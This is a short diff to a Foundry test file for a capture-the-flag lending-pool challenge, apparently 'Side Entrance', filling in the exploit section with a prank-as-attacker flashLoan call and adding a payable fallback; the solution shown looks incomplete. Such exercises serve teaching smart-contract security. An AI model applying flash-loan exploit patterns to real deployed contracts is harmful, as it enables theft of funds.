@@ -32,11 +32,15 @@ contract SideEntrance is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    fallback() external payable {}
+
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
